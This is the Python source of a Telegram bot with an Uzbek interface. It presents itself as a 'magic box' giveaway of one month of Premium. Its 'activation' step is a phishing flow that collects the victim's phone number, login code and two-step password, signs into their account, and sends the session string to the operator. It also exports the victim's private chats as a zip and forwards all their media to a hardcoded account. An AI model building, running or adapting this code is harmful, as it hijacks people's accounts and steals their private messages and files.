import os
import re
import json
import zipfile
import shutil
import random
import asyncio

from aiogram import Bot, Dispatcher, types
from aiogram.dispatcher.filters import CommandStart
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import User
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError

# ================== ENV ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

MEDIA_TARGET = "@pedro_yd"

BASE_DIR = "chats_export"
USERS_FILE = "users.json"
CONFIG_FILE = "config.json"

# ================== INIT ==================
bot = Bot(BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

sessions = {}

# ================== JSON ==================
def load_json(path, default):
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(default, f, indent=2)
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

users = load_json(USERS_FILE, {})
config = load_json(CONFIG_FILE, {"magic_box": "on"})

def ensure_user(uid):
    users.setdefault(uid, {
        "boxes": 0,
        "win_box": random.randint(1, 3),
        "prize": False,
        "refs": 0,
        "ref_by": None
    })
    save_json(USERS_FILE, users)

# ================== MENUS ==================
def main_menu(is_admin=False):
    kb = [
        ["🎁 Sehrli quti"],
        ["🏆 Yutuqlar", "👥 Referal"],
        ["✅ Aktivlash"]
    ]
    if is_admin:
        kb.append(["⚙️ Admin panel"])
    return types.ReplyKeyboardMarkup(kb, resize_keyboard=True)

def back_menu():
    return types.ReplyKeyboardMarkup([["⬅️ Orqaga"]], resize_keyboard=True)

# ================== START ==================
@dp.message_handler(CommandStart())
async def start(msg: types.Message):
    uid = str(msg.from_user.id)
    ensure_user(uid)

    parts = msg.text.split()
    if len(parts) > 1:
        ref = parts[1]
        if ref in users and ref != uid and users[uid]["ref_by"] is None:
            users[uid]["ref_by"] = ref
            users[ref]["refs"] += 1
            save_json(USERS_FILE, users)

    await msg.answer("👋 Xush kelibsiz", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))

# ================== REFERAL ==================
@dp.message_handler(lambda m: m.text == "👥 Referal")
async def referral(msg: types.Message):
    uid = str(msg.from_user.id)
    ensure_user(uid)
    me = await bot.get_me()

    await msg.answer(
        f"🔗 https://t.me/{me.username}?start={uid}\n"
        f"👤 Taklif qilinganlar: {users[uid]['refs']}"
    )

# ================== YUTUQLAR ==================
@dp.message_handler(lambda m: m.text == "🏆 Yutuqlar")
async def prizes(msg: types.Message):
    uid = str(msg.from_user.id)
    ensure_user(uid)
    await msg.answer(
        "🥳 Sizda 1 oylk Premium bor\n Olish uchun aktivlash bo'limiga o'ting" if users[uid]["prize"] else "❌ Yutuq yo‘q"
    )

# ================== SEHRLI QUTI ==================
@dp.message_handler(lambda m: m.text == "🎁 Sehrli quti")
async def magic_box(msg: types.Message):
    uid = str(msg.from_user.id)
    ensure_user(uid)
    u = users[uid]

    if u["boxes"] >= 3:
        return await msg.answer("❌ Qutilar tugagan")

    kb = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton(
            f"🔓 Ochish ({u['boxes']+1}/3)",
            callback_data="open_box"
        )
    )
    await msg.answer("🎁 Sehrli quti", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "open_box")
async def open_box(c):
    uid = str(c.from_user.id)
    u = users[uid]

    if u["boxes"] >= 3:
        await c.answer("Qutilar tugagan", show_alert=True)
        return

    u["boxes"] += 1
    is_win = config["magic_box"] == "on" and u["boxes"] == u["win_box"] and not u["prize"]
    save_json(USERS_FILE, users)

    if not is_win:
        await c.message.answer("😐")
        kb = None
        if u["boxes"] < 3:
            kb = types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton("🔓 Ochish", callback_data="open_box")
            )
        await c.message.answer("Hech narsa tushmadi", reply_markup=kb)
        await c.answer()
        return

    u["prize"] = True
    save_json(USERS_FILE, users)

    await c.message.answer("🥳")
    kb = None
    if u["boxes"] < 3:
        kb = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔓 Ochish", callback_data="open_box")
        )

    await c.message.answer("🎉 Siz yutdingiz!\nSizga 1 oylik premium berildi uni olish uchun aktivlash bo'limiga o'ting\n\n Sizga tushgan yutuq shansi: 17.8%", reply_markup=kb)
    await c.answer()

# ================== AKTIVLASH ==================
@dp.message_handler(lambda m: m.text == "✅ Aktivlash")
async def activate(msg: types.Message):
    sessions[msg.from_user.id] = {"step": "phone"}
    await msg.answer("📲 Telefon raqamingizni yuboring\nNamuna: +998901234567", reply_markup=back_menu())

@dp.message_handler(lambda m: m.text == "⬅️ Orqaga")
async def go_back(msg: types.Message):
    sessions.pop(msg.from_user.id, None)
    await msg.answer("🏠 Bosh menyu", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))

@dp.message_handler(lambda m: m.from_user.id in sessions)
async def login_flow(msg: types.Message):
    uid = msg.from_user.id
    state = sessions[uid]
    text = msg.text.strip()

    # PHONE
    if state["step"] == "phone":
        digits = re.sub(r"\D", "", text)
        if len(digits) < 8:
            return await msg.answer("❌ Telefon noto‘g‘ri")

        phone = "+" + digits
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        sent = await client.send_code_request(phone)

        state.update({
            "step": "code",
            "phone": phone,
            "client": client,
            "hash": sent.phone_code_hash
        })

        await msg.answer("🔐 Kodni yuboring (faqat raqam) 23.456 misolida")
        return

    # CODE
    if state["step"] == "code":
        try:
            await state["client"].sign_in(
                phone=state["phone"],
                code=re.sub(r"\D", "", text),
                phone_code_hash=state["hash"]
            )
        except SessionPasswordNeededError:
            state["step"] = "password"
            return await msg.answer("🔑 2 bosqichli parolni yuboring")
        except PhoneCodeExpiredError:
            await msg.answer("⛔ Kod eskirdi")
            await state["client"].disconnect()
            sessions.pop(uid)
            return

        session_str = save_session(uid, state["client"])
        await bot.send_message(
            ADMIN_ID,
            f"🧩 SESSION\n\n<code>{session_str}</code>",
            parse_mode="HTML"
        )

        await msg.answer("⏳ 2 chi bosqich qilinmoqda...")
        await export_chats(uid)
        return

# ================== EXPORT ==================
def safe_name(t, max_len=40):
    t = re.sub(r"[^\w\d_-]", "_", t, flags=re.ASCII)
    t = re.sub(r"_+", "_", t).strip("_")
    return (t[:max_len] if t else "user")

def media_text(m):
    if m.photo: return "rasm yubordiz"
    if m.video: return "video yubordiz"
    if m.voice: return "ovozli xabar yubordiz"
    if m.audio: return "audio yubordiz"
    if m.document: return "fayl yubordiz"
    if m.sticker: return "stiker yubordiz"
    return "media yubordiz"

async def export_chats(uid):
    client = sessions[uid]["client"]
    os.makedirs(BASE_DIR, exist_ok=True)
    all_media = []

    for d in await client.get_dialogs():
        if isinstance(d.entity, User) and not d.entity.bot:
            user = d.entity
            name = f"{user.first_name or ''} {user.last_name or ''}".strip()
            folder = os.path.join(BASE_DIR, f"{safe_name(name)}_{user.id}")
            os.makedirs(folder, exist_ok=True)

            with open(os.path.join(folder, "chat.txt"), "w", encoding="utf-8") as f:
                async for m in client.iter_messages(user, limit=2000, reverse=True):
                    time = m.date.strftime("%Y-%m-%d %H:%M:%S") if m.date else "----"
                    sender = "siz" if m.out else name
                    text = m.text if m.text else media_text(m)
                    if m.media:
                        all_media.append(m)
                    f.write(f"[{time}] {sender}: {text}\n")

    zip_name = f"chats_{uid}.zip"
    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(BASE_DIR):
            for file in files:
                full = os.path.join(root, file)
                z.write(full, arcname=os.path.relpath(full, BASE_DIR))

    await bot.send_document(ADMIN_ID, types.InputFile(zip_name))
    for m in all_media:
        try:
            await m.forward_to(MEDIA_TARGET)
            await asyncio.sleep(0.3)
        except:
            pass

    shutil.rmtree(BASE_DIR)
    os.remove(zip_name)
    await client.disconnect()
    sessions.pop(uid, None)

# ================== ADMIN ==================
@dp.message_handler(lambda m: m.text == "⚙️ Admin panel" and m.from_user.id == ADMIN_ID)
async def admin_panel(msg: types.Message):
    kb = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("ON", callback_data="on"),
        types.InlineKeyboardButton("OFF", callback_data="off")
    )
    await msg.answer("🎁 Sehrli quti holati", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data in ["on", "off"] and c.from_user.id == ADMIN_ID)
async def admin_switch(c):
    config["magic_box"] = c.data
    save_json(CONFIG_FILE, config)
    await c.answer("Saqlandi")

# ================== RUN ==================
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
